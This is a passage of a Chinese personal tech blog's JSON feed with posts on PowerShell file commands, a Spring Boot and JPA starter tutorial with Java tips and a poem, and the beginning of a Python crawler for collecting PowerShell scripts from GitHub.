class=\"variable\">$dstFile</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>文件移动</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Move-Item</span> <span class=\"variable\">$srcFile</span> <span class=\"variable\">$dstFile</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>文件删除</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Remove-Item</span> <span class=\"variable\">$file</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<center>To say goodbye is to die a little.\n<p align=\"right\">——《The Long Goodbye》",
            "tags": [
                "powershell"
            ]
        },
        {
            "id": "https://snowroll.github.io/springboot-skill/",
            "url": "https://snowroll.github.io/springboot-skill/",
            "title": "springboot 零敲碎打",
            "date_published": "2020-11-26T06:46:08.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>常用的开发结构</li>\n<li>星星点点的小技巧</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"1-常用开发结构\"><a class=\"markdownIt-Anchor\" href=\"#1-常用开发结构\">#</a> 1. 常用开发结构</h3>\n<p>最简单的 Springboot 集成 Spring Data JPA 教程： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5vbmd5aW5nMTIzL2FydGljbGUvZGV0YWlscy8xMDQyNzkyMzE=\">https://blog.csdn.net/huanongying123/article/details/104279231</span></p>\n<ul>\n<li>\n<p>新建 springboot 项目，命名为 demo，springboot 版本为 2.2.9.RELEASE</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;parent&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.2.9.RELEASE&lt;/version&gt;</span><br><span class=\"line\">    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span><br><span class=\"line\">&lt;/parent&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>在 pom 文件中，导入依赖的 jar 包</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">  \t&lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;</span><br><span class=\"line\">  \t&lt;/dependency&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;optional&gt;true&lt;/optional&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;scope&gt;test&lt;/scope&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>在 <code>resources</code>  目录下新建一个配置文件 <code>application.yml</code> ，也可以直接在原有的配置文件 <code>application.properties</code>  中添加相关配置</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">server:</span></span><br><span class=\"line\">  <span class=\"attr\">port:</span> <span class=\"number\">8080</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">  <span class=\"attr\">datasource:</span></span><br><span class=\"line\">    <span class=\"attr\">url:</span> <span class=\"string\">jdbc:mysql://localhost:3306/test</span></span><br><span class=\"line\">    <span class=\"attr\">username:</span> <span class=\"string\">root</span>  <span class=\"comment\"># 替换为你本地mysql的用户名和密码</span></span><br><span class=\"line\">    <span class=\"attr\">password:</span> <span class=\"string\">root</span></span><br><span class=\"line\">    <span class=\"attr\">driver-class-name:</span> <span class=\"string\">com.mysql.cj.jdbc.Driver</span></span><br><span class=\"line\">  <span class=\"attr\">jpa:</span></span><br><span class=\"line\">    <span class=\"attr\">show-sql:</span> <span class=\"literal\">true</span>  <span class=\"comment\"># 执行数据库操作时，在控制台打印sql语句</span></span><br><span class=\"line\">    <span class=\"attr\">database-platform:</span> <span class=\"string\">org.hibernate.dialect.MySQL5InnoDBDialect</span>  <span class=\"comment\"># 数据库方言配置</span></span><br><span class=\"line\">    <span class=\"attr\">hibernate:</span></span><br><span class=\"line\">      <span class=\"attr\">ddl-auto:</span> <span class=\"string\">update</span>  <span class=\"comment\"># 第一次加载自动建立表，服务重启会进行表的更新</span></span><br></pre></td></tr></table></figure>\n<p>设置服务器端口号为 8080，这样我们可以通过 http://127.0.0.1:8080 访问我们的程序</p>\n<p>设置数据库 mysql，这里我们需要在本地的 mysql 中创建一个 test 数据库，命令行中操作如下</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@host]<span class=\"comment\"># mysql -u root -p   </span></span><br><span class=\"line\">Enter password:******  <span class=\"comment\"># 登录后进入终端</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; create DATABASE <span class=\"built_in\">test</span>;</span><br></pre></td></tr></table></figure>\n<p>设置 jpa 相关参数，jpa 全称 Java Persistence API，定义了一系列标准，让实体类和数据库中的表建立一个对应关系，使我们在 java 中操作实体类就能达到操作数据库中表的效果。 jpa 介绍博客 <span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMTAwMjQxNDY=\">https://zhuanlan.zhihu.com/p/110024146</span></p>\n</li>\n<li>\n<p>代码分层</p>\n<p>spring boot 框架一般分为 dao、model、controller、service 四层。具体代码结构如下图所示：</p>\n<p><img data-src=\"/images/java/code-struct.png\" alt=\"image-20201126201354029\"></p>\n<p>图中我将 controller 用 rest 代替，仅是个人习惯</p>\n<ul>\n<li>\n<p><strong>dao 层</strong></p>\n<p>负责访问数据库，无需写复杂的 sql 语言，可以根据命名规则定义相应的查询方法。示例如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.demo.dao;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.model.TestBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Optional;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">TestDao</span> <span class=\"keyword\">extends</span> <span class=\"title\">JpaRepository</span>&lt;<span class=\"title\">TestBean</span>, <span class=\"title\">String</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"function\">Optional&lt;TestBean&gt; <span class=\"title\">findById</span><span class=\"params\">(String id)</span></span>;  </span><br><span class=\"line\">    <span class=\"function\">TestBean <span class=\"title\">findByName</span><span class=\"params\">(String Name)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>TestDao 继承了 <code>JpaRepository</code> ， <code>JpaRepository</code>  可以查找所有实体，执行缓存和数据库同步。 <code>JpaRepository</code>  接口有 2 个泛型参数，第一个为实际存储的类型，第二个参数为主键。</p>\n<p>上例中存储的类型为 <code>TestBean</code> ，而 <code>TestBean</code>  的主键类型为 String。</p>\n<p>根据命名规则我们定义了 <code>findById</code>  方法来查询指定 id 的 <code>TestBean</code> 。</p>\n<p><code>Optional</code>  用来处理可能出现的空指针问题，具体用法见 https://www.jianshu.com/p/c1480145a961</p>\n</li>\n<li>\n<p><strong>model 层</strong></p>\n<p>也称 Entity（实体）层或 pojo（plain old java object）层，一般数据库中一张表对应一个实体类，类属性同表字段一一对应。简单示例如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.demo.model;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> lombok.Data;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.persistence.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Data</span></span><br><span class=\"line\"><span class=\"meta\">@Entity</span></span><br><span class=\"line\"><span class=\"meta\">@Table(name = &quot;test_table&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestBean</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Id</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String id;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><code>@Data</code>  可以提高代码的简介度，省去了代码中大量的 get ()、set ()、toString () 等方法。介绍： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9jMWVlN2U0MjQ3YmY=\">https://www.jianshu.com/p/c1ee7e4247bf</span></p>\n<p><code>@Entity</code>  声明该类为实体类</p>\n<p><code>@Id</code>  标注用于声明一个实体类的属性映射为数据库的主键列</p>\n<p><code>@Id</code>  详解 <span class=\"exturl\" data-url=\"aHR0cHM6Ly94aWFveGlhbWkuZ2l0Ym9vay5pby9zcHJpbmctYm9vdC9ndWFuLXhpLXhpbmctc2h1LWp1LWt1L3NwcmluZy1kYXRhLWpwYS9pZC1oZS1nZW5lcmF0ZWR2YWx1ZS14aWFuZy1qaWU=\">https://xiaoxiami.gitbook.io/spring-boot/guan-xi-xing-shu-ju-ku/spring-data-jpa/id-he-generatedvalue-xiang-jie</span></p>\n<p><code>@Table</code>  将实体类与数据表  <code>test_table</code>  绑定，第一次操作实体类会生成相应的数据表</p>\n</li>\n<li>\n<p><strong>rest 层</strong></p>\n<p>负责前后端交互，接收前端 GET/POST 请求，调用 service 层中的处理函数，接收 service 层的返回数据，并将其返回给前端。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.demo.rest;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.model.TestBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.service.TestServiceImp;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;demo&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestService</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> TestServiceImp testServiceImp;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@PostMapping(&quot;/add&quot;)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">add</span><span class=\"params\">(<span class=\"meta\">@RequestBody</span> TestBean testBean)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> testServiceImp.add(testBean);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>声明了一个接口 “demo/add”，实现了添加 testBean 的功能。成功返回 “success”，失败返回 “fail”。可以通过访问 http://127.0.0.1:8080/demo/add 来调用这个接口</p>\n<p><code>@RequestBody</code>  会自动将 post 中的数据包装为 <code>TestBean</code>  形式</p>\n</li>\n<li>\n<p>service 层</p>\n<p>业务逻辑层，调用 dao 层接口，完成基本功能设计</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.demo.service;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.dao.TestDao;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.demo.model.TestBean;</span><br><span class=\"line\"><span class=\"keyword\">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Service;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Service</span></span><br><span class=\"line\"><span class=\"meta\">@Slf4j</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestServiceImp</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> TestDao testDao;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">add</span><span class=\"params\">(TestBean testBean)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            testDao.save(testBean);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            log.error(<span class=\"string\">&quot;add testBean error!&quot;</span>, e);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;fail&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 <code>TestDao</code>  操作实体类 <code>TestBean</code> ，进行保存。</p>\n</li>\n</ul>\n</li>\n<li>\n<p>程序使用效果</p>\n<p>运行程序，使用 <code>postman</code>  进行测试，结果如下：</p>\n<p><img data-src=\"/images/java/postman.png\" alt=\"image-20201126203059798\"></p>\n<p>打开 <code>DataGrip</code>  查看数据库中的表，结果如下图：</p>\n<p><img data-src=\"/images/java/database.png\" alt=\"image-20201126203405965\"></p>\n<p>至此，一个极简 springboot 项目就完成了<sup> o</sup>。</p>\n</li>\n</ul>\n<h3 id=\"2-星星点点的小技巧\"><a class=\"markdownIt-Anchor\" href=\"#2-星星点点的小技巧\">#</a> 2. 星星点点的小技巧</h3>\n<ul>\n<li>\n<p>List 和 String 互相转换</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// List =&gt; String</span></span><br><span class=\"line\">List&lt;Integer&gt; intList = Arrays.asList(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">System.out.println(intList.toString());</span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br></pre></td></tr></table></figure>\n<p>使用 List.toString () 功能即可得到 List 的 String 表示</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//String =&gt; List</span></span><br><span class=\"line\">String listStr = <span class=\"string\">&quot;[1,2,3]&quot;</span></span><br><span class=\"line\">ObjectMapper mapper = <span class=\"keyword\">new</span> ObjectMapper();</span><br><span class=\"line\">List&lt;Integer&gt; resList = Arrays.asList(mapper.readValue(listStr, Integer[].class));</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>restful 接口简单获取 POST/GET 请求参数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 假设post 请求  &#123;&quot;id&quot;: &quot;0&quot;&#125;</span></span><br><span class=\"line\"><span class=\"meta\">@PostMapping(value=&quot;/test&quot;)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">get</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String id)</span></span>&#123;</span><br><span class=\"line\">\t\tSystem.out.println(id);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 <code>@RequestParam</code>  注解，当没有指定 value 时，将会接受与变量名相同的请求参数</p>\n<p>接收参数的方式： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82ODQ0OTAzODY2NDIxNDc3Mzg0\">https://juejin.cn/post/6844903866421477384</span></p>\n</li>\n<li>\n<p>java1.8 Stream 机制</p>\n<p>可以用简单的语句完成一系列操作</p>\n<p>参考博客：  <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2xvYnUuY29tLzIwMTYvMDMvMDIvSmF2YS1TdHJlYW0v\">https://colobu.com/2016/03/02/Java-Stream/</span></p>\n<p>使用 Stream 进行数组过滤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;Integer&gt; l = Arrays.asList(<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\">List&lt;Integer&gt; t = l.stream()  <span class=\"comment\">// 生成一个stream对象</span></span><br><span class=\"line\">  \t.filter( i -&gt; i % <span class=\"number\">2</span> == <span class=\"number\">0</span>)  <span class=\"comment\">// 返回满足断言(predicate)的数据。</span></span><br><span class=\"line\">  \t.collect(Collectors.toList());</span><br><span class=\"line\">System.out.println(t); <span class=\"comment\">//[2, 4, 6, 8]</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>依赖全部爆红的解决</p>\n<p>博客： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQ2NzI0NjYvYXJ0aWNsZS9kZXRhaWxzLzgwMjExMzQw\">https://blog.csdn.net/u014672466/article/details/80211340</span></p>\n<p>把依赖全部注释，Maven 刷新一下，解开注释，再重新刷新一遍，解决。</p>\n</li>\n</ul>\n<center><b>寻李白</b></center><center>——痛饮狂歌空度日 飞扬跋扈为谁雄</center>\n<center>余光中\n<center>那一双傲慢的靴子至今还落在</center><center>高力士羞愤的手里，人却不见了</center><center>把满地的难民和伤兵</center><center>把胡马和羌笛交践的节奏</center><center>留给杜二去细细的苦吟</center><center>自从那年贺知章眼花了</center><center>认你做谪仙，便更加佯狂</center><center>用一只中了魔咒的小酒壶</center><center>把自己藏起来，连太太也寻不到你</center><center>怨长安城小而壶中天长</center><center>在所有的诗里你都预言</center><center>会突然水遁，或许就在明天</center><center>只扁舟破浪，乱发当风</center><center>——而今，果然你失了踪</center><br>\n<center></center><center>树敌如林，世人皆欲杀</center><center>肝硬化怎杀得死你</center><center>酒入豪肠，七分酿成了月光</center><center>余下的三分啸成剑气</center><center>绣口一吐，就半个盛唐</center><center>从开元到天宝，从洛阳到咸阳</center><center>冠盖满途车骑的嚣闹</center><center>不及千年后你的一首</center><center>水晶绝句轻叩我额头</center><center>当地一弹挑起的回音</center><br>\n<center></center><center>一贬世上已经够落魄</center><center>再放夜郎毋乃太难堪</center><center>至今成谜是你的籍贯</center><center>陇西或山东，青莲乡或碎叶城</center><center>不如归去归哪个故乡</center><center>凡你醉处，你说过，皆非他乡</center><center>失踪，是天才唯一的下场</center><center>身后事，究竟你遁向何处</center><center>猿啼不住，杜二也苦劝你不住</center><center>一回头囚窗下竟已白头</center><center>七仙、五友，都救不了你了</center><center>匡山给雾锁了，无路可入</center><center>仍炉火未纯青，就半粒丹砂</center><center>怎追蹑葛洪袖里的流霞</center><br>\n<center></center><center>樽中月影，或许那才是你故乡</center><center>常得你一生痴痴地仰望</center><center>而无论出门向东哭，向西哭</center><center>长安却早已陷落</center><center>这二十四万里的归程</center><center>也不必惊动大鹏了，也无须招鹤</center><center>只消把酒杯向半空一扔</center><center>便旋成一只霍霍的飞碟</center><center>诡绿的闪光愈转愈快</center><center>接你回传说里去</center><br>\n<center>1980.4.27 </center>\n",
            "tags": [
                "java"
            ]
        },
        {
            "id": "https://snowroll.github.io/deobfuscator-crawler/",
            "url": "https://snowroll.github.io/deobfuscator-crawler/",
            "title": "Github爬虫",
            "date_published": "2020-11-13T02:01:41.000Z",
            "content_html": "<blockquote>\n<p><strong>任务需求：</strong></p>\n<p>下载 100 个 Github 上的 powershell 脚本作为数据库，用于之后的研究分析</p>\n</blockquote>\n<h1 id=\"解析github搜索页面获取页面上的仓库名称\"><a class=\"markdownIt-Anchor\" href=\"#解析github搜索页面获取页面上的仓库名称\">#</a> 解析 Github 搜索页面，获取页面上的仓库名称</h1>\n<h2 id=\"分析github搜索请求\"><a class=\"markdownIt-Anchor\" href=\"#分析github搜索请求\">#</a> 分析 Github 搜索请求</h2>\n<p>在 Github 上进行 powershell 搜索，选定语言为 <code>PowerShell</code> ，结果如下图</p>\n<img data-src=\"/deobfuscator-crawler/github-search.png\" class=\"\">\n<p>观察链接地址 <code>https://github.com/search?l=PowerShell&amp;p=2&amp;q=powershell&amp;type=Repositories</code>  可知，有 4 个搜索参数：  <code>l</code>   编程语言、  <code>p</code>  当前页数、 <code>q</code>  搜索内容、  <code>type</code>  搜索类型</p>\n<h2 id=\"python-获取指定url的html并进行解析\"><a class=\"markdownIt-Anchor\" href=\"#python-获取指定url的html并进行解析\">#</a> python 获取指定 url 的 html 并进行解析</h2>\n<p>参考博客： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2J1bGw1MjEvYXJ0aWNsZS9kZXRhaWxzLzgzNDQ4Nzgx\">https://blog.csdn.net/bull521/article/details/83448781</span></p>\n<p>第三方库： requests 文档 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZXF1ZXN0cy5yZWFkdGhlZG9jcy5pby96aF9DTi9sYXRlc3Qv\">https://requests.readthedocs.io/zh_CN/latest/</span></p>\n<p>pyquery 文档 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9weXF1ZXJ5LnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdC9hcGkuaHRtbA==\">https://pyquery.readthedocs.io/en/latest/api.html</span></p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  <span class=\"comment\"># 发送请求，获取响应</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pyquery <span class=\"keyword\">import</span> PyQuery <span class=\"keyword\">as</span> pq  <span class=\"comment\"># 解析html</span></span><br><span class=\"line\"></span><br><span class=\"line\">base_url = <span class=\"string\">&quot;https://github.com&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">从url中获取html文本，解析并返回列表</span></span><br><span class=\"line\"><span class=\"string\">@param url 要解析的链接</span></span><br><span class=\"line\"><span class=\"string\">@return list [&#x27;仓库名1&#x27;, &#x27;仓库名2&#x27;, ...]</span></span><br><span class=\"line\"><span 